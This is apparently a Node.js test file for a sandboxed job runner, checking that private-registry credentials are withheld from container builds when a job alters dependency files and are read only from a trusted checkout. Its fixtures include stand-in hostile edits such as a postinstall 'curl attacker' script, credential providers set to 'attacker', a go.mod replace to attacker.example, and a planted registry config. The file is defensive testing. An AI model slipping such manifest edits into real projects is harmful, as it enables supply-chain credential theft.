import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import test from 'node:test';
import { composeSandboxImage, ensureComposedImageBuilt } from '../lib/sandbox-images.mjs';
import { createVerificationRunner } from '../lib/verify.mjs';
import { createOpenClawRunner } from '../lib/openclaw-run.mjs';
import { createExecutor } from '../lib/execute.mjs';
import { createVerificationFlow } from '../lib/verification-flow.mjs';

const base = {
  'package.json': '{"workspaces":["packages/*"]}', 'package-lock.json': '{}',
  'go.mod': 'module example.com/demo\n', 'go.sum': '',
  'Cargo.toml': '[package]\nname="demo"\nversion="0.1.0"\n', 'Cargo.lock': '',
  'requirements.txt': 'example==1\n',
};
function write(root, name, contents) {
  fs.mkdirSync(path.dirname(path.join(root, name)), { recursive: true });
  fs.writeFileSync(path.join(root, name), contents);
}
function fixture(t) {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'nomarmy-trusted-'));
  t.after(() => fs.rmSync(root, { recursive: true, force: true }));
  const trustedDir = path.join(root, 'trusted'), cwd = path.join(root, 'job');
  for (const dir of [trustedDir, cwd]) for (const [name, content] of Object.entries(base)) write(dir, name, content);
  const credential = path.join(root, 'credential');
  fs.writeFileSync(credential, 'synthetic-token-never-output');
  // Declared in the trusted checkout, as an operator would; the job's copy is irrelevant.
  write(trustedDir, '.nomarmy.local.yml', `registries:\n  npm: ${credential}\n`);
  return { root, trustedDir, cwd, credential };
}
function capture() {
  const calls = [], notes = [];
  return { calls, notes, onNote: note => notes.push(note), run(cmd, args) {
    if (args[0] === 'images') return '';
    calls.push({ cmd, args, dockerfile: fs.readFileSync(args[args.indexOf('-f') + 1], 'utf8') });
    return '';
  } };
}
const noteFor = paths => `private-registry credentials were not used: this job changed dependency inputs (${paths})`;

for (const [name, content] of [
  ['package-lock.json', '{"changed":true}'],
  ['package.json', '{"workspaces":["packages/*"],"scripts":{"postinstall":"curl attacker"}}'],
  ['.cargo/config.toml', '[registry]\nglobal-credential-providers=["attacker"]\n'],
  ['.cargo/config', '[registry]\nglobal-credential-providers=["attacker"]\n'],
  ['go.mod', 'module example.com/demo\nreplace example.com/private => attacker.example/mod v1.0.0\n'],
  ['go.sum', 'changed\n'], ['Cargo.lock', 'changed\n'],
  ['packages/new/package.json', '{"name":"new","scripts":{"postinstall":"attacker"}}'],
  ['requirements.txt', 'attacker==1\n'],
]) {
  test(`trusted registry blocks changed input ${name}`, t => {
    const f = fixture(t);
    write(f.cwd, name, content);
    const build = capture();
    const recipe = composeSandboxImage(f.cwd, null, undefined, { trustedDir: f.trustedDir });
    assert.deepEqual(Object.keys(recipe).sort(), ['dockerfile', 'files', 'image', 'note', 'pathEntries']);
    assert.equal(recipe.note, noteFor(name));
    const image = ensureComposedImageBuilt(f.cwd, null, { ...build, trustedDir: f.trustedDir });
    assert.equal(image, recipe.image);
    assert.deepEqual(build.notes, [noteFor(name)]);
    assert.equal(build.calls.length, 1);
    const call = build.calls[0];
    assert.equal(call.cmd, 'podman');
    assert.equal(call.args.includes('--secret'), false);
    assert.equal(call.dockerfile.includes('--mount=type=secret'), false);
    assert.equal(call.dockerfile.includes('synthetic-token-never-output'), false);
  });
}

test('trusted registry accepts identical bytes and same checkout, fails closed without trust or on removed paths', t => {
  const f = fixture(t);
  // This test also treats the job folder as the operator's own checkout (and as
  // one with no trusted checkout at all), so it declares registries there too.
  write(f.cwd, '.nomarmy.local.yml', `registries:\n  npm: ${f.credential}\n`);
  for (const trustedDir of [f.trustedDir, f.cwd]) {
    const build = capture();
    ensureComposedImageBuilt(f.cwd, null, { ...build, trustedDir });
    assert.deepEqual(build.notes, []);
    assert.deepEqual(build.calls[0].args.slice(0, 3), ['build', '--secret', `id=npm,src=${f.credential}`]);
    assert.match(build.calls[0].dockerfile, /RUN --mount=type=secret,id=npm,/);
  }
  const missing = capture();
  ensureComposedImageBuilt(f.cwd, null, missing);
  assert.deepEqual(missing.notes, [noteFor('trusted checkout unavailable')]);
  assert.equal(missing.calls[0].args.includes('--secret'), false);
  assert.equal(missing.calls[0].dockerfile.includes('--mount=type=secret'), false);
  fs.rmSync(path.join(f.cwd, 'go.sum'));
  const removed = capture();
  ensureComposedImageBuilt(f.cwd, null, { ...removed, trustedDir: f.trustedDir });
  assert.deepEqual(removed.notes, [noteFor('go.sum')]);
  assert.equal(removed.calls[0].args.includes('--secret'), false);
  const cached = capture();
  ensureComposedImageBuilt(f.cwd, null, { trustedDir: f.trustedDir, onNote: cached.onNote, run: () => 'cached' });
  assert.deepEqual(cached.notes, [noteFor('go.sum')]);
});

for (const failBuild of [false, true]) {
  test(`verification and persisted job issues explain withheld credentials (build fails=${failBuild})`, async t => {
    const f = fixture(t), build = capture();
    const config = { verification: { quick: { environment: 'none', commands: ['test'] } } };
    const runner = createVerificationRunner({ hostProjectDir: f.trustedDir,
      loadConfig: () => ({ found: true, config }), sandboxImageRun: (cmd, args) => {
        const value = build.run(cmd, args);
        if (failBuild && args[0] === 'build') throw new Error('synthetic-token-never-output');
        return value;
      }, executor: { probe: async () => ({ available: true }), run: async () => ({ started: true, exitCode: 1, stdout: '', stderr: '' }) },
    });
    if (!failBuild) {
      await runner({ cwd: f.cwd, profile: 'quick', record: {} });
      assert.deepEqual(build.calls[0].args.slice(0, 3), ['build', '--secret', `id=npm,src=${f.credential}`]);
    }
    write(f.cwd, 'go.sum', 'changed');
    const flow = createVerificationFlow({});
    flow.registerVerificationRunner(runner);
    const executor = createExecutor({ VERSION: 'test', projectDir: f.trustedDir, jobsRoot: f.root,
      assertRepo: async () => {}, ensureJobsRoot: () => f.root, resolveBase: async () => ({ ref: 'base', sha: 'base' }),
      collectGitRecord: async () => ({}), ...flow,
      // Stub worktree operations: no Git or Podman processes are launched.
      run: async (_cmd, args) => {
        if (args[1] === 'add') fs.cpSync(f.cwd, args[3], { recursive: true });
        else fs.rmSync(args[3], { recursive: true, force: true });
      },
    });
    const result = await executor.executeJob({ task: 'verify', mode: 'verify', verification: 'quick', jobId: 'check' });
    const manifest = JSON.parse(fs.readFileSync(path.join(result.jobDir, 'metadata.json'), 'utf8'));
    assert.deepEqual(manifest.issues, [noteFor('go.sum')]);
    assert.equal(manifest.verification.status, failBuild ? 'not_run' : 'fail');
    assert.equal(manifest.verification.detail.includes(noteFor('go.sum')), true);
    assert.equal(JSON.stringify(manifest).includes('synthetic-token-never-output'), false);
    assert.equal(build.calls.at(-1).args.includes('--secret'), false);
    assert.equal(build.calls.at(-1).dockerfile.includes('--mount=type=secret'), false);
  });
}

test('worker sandbox resolution supplies the operator projectDir as trustedDir', t => {
  const f = fixture(t);
  const runner = createOpenClawRunner({ projectDir: f.trustedDir });
  const runtime = path.join(f.root, 'runtime'); fs.mkdirSync(runtime);
  let options;
  runner.resolveWorkerSandboxOverride(f.cwd, runtime, {
    loadConfigFn: () => ({ found: false }), ambientConfigPathFn: () => null,
    sandboxPathEntriesFn: () => [], resolveSandboxImageFn: value => { options = value; return 'test:image'; },
  });
  assert.deepEqual(Object.keys(options).sort(), ['config', 'cwd', 'defaultImage', 'explicitImage', 'trustedDir']);
  assert.equal(options.trustedDir, f.trustedDir);
  assert.equal(options.cwd, f.cwd);
});

test("registry declarations are read only from the trusted checkout, never from a worker-writable worktree", async () => {
  const fs = await import("node:fs"), os = await import("node:os"), path = await import("node:path");
  const { ensureComposedImageBuilt } = await import("../lib/sandbox-images.mjs");
  const root = fs.mkdtempSync(path.join(os.tmpdir(), "nomarmy-registry-origin-"));
  const trusted = path.join(root, "trusted"), worktree = path.join(root, "worktree"), secret = path.join(root, "planted-secret");
  try {
    for (const dir of [trusted, worktree]) {
      fs.mkdirSync(dir, { recursive: true });
      fs.writeFileSync(path.join(dir, "package.json"), '{"name":"x"}');
      fs.writeFileSync(path.join(dir, "package-lock.json"), "{}");
    }
    fs.writeFileSync(secret, "//registry.example/:_authToken=planted\n");
    // A worker plants a local config in its worktree; the trusted checkout declares nothing.
    fs.writeFileSync(path.join(worktree, ".nomarmy.local.yml"), `registries:\n  npm: ${secret}\n`);
    const calls = [];
    const run = (cmd, args) => { calls.push(args); if (args[0] === "images") return ""; return ""; };
    ensureComposedImageBuilt(worktree, null, { run, trustedDir: trusted });
    const build = calls.find((args) => args[0] === "build");
    assert.ok(build, "an image is still built");
    assert.ok(!build.includes("--secret"), "the worktree's planted declaration is ignored");
    // Without a trusted checkout, nothing is declared at all.
    calls.length = 0;
    ensureComposedImageBuilt(worktree, null, { run });
    assert.ok(!calls.find((args) => args[0] === "build").includes("--secret"));
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
  }
});
